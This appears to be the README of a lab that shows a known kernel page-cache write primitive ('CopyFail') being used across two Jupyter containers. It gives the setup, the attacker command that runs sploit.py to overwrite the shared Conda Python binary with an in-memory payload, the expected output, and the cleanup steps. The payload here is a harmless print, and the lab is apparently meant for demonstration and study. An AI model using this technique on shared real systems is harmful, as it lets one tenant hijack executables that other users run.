# Notebook Runtime Lab

Minimal Jupyter-image variant of CopyOverlayFail.

Both containers use `quay.io/jupyter/base-notebook`. The attacker poisons the shared Conda Python executable. The victim later starts Python, simulating a new notebook kernel launch, and runs an in-memory ELF payload generated by `sploit.py`.

This is not a new vulnerability and not host escape. It reuses the original CopyFail primitive against a shared notebook image-layer file.

## Run

```bash
docker compose up -d
```

Open both notebooks:

```text
attacker: http://127.0.0.1:8888/?token=attacker
victim:   http://127.0.0.1:9999/?token=victim
```

In the victim notebook, open a Terminal and baseline Python:

```bash
/opt/conda/bin/python -c 'print("kernel-ok")'
```

Expected:

```text
kernel-ok
```

In the attacker notebook, open a Terminal and poison shared Conda Python:

```bash
/opt/conda/bin/python /lab/sploit.py /opt/conda/bin/python --payload-text PWND
```

Expected:

```text
[+] target: /opt/conda/bin/python
[+] in-memory print payload: 'PWND'
[+] payload length: 160 bytes
[+] wrote 160 bytes through AF_ALG/splice page-cache primitive
```

Back in the victim Terminal, start Python again:

```bash
/opt/conda/bin/python -c 'print("kernel-ok")'
```

Expected:

```text
PWND
```

That final command represents a future notebook kernel start. Already-running Python kernels are not affected; the trigger is the next `execve()` of the poisoned Python inode.

## Cleanup

```bash
docker compose down --remove-orphans
sudo sync
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
```

Use a disposable VM. This can poison cached executable pages for the local Jupyter image.
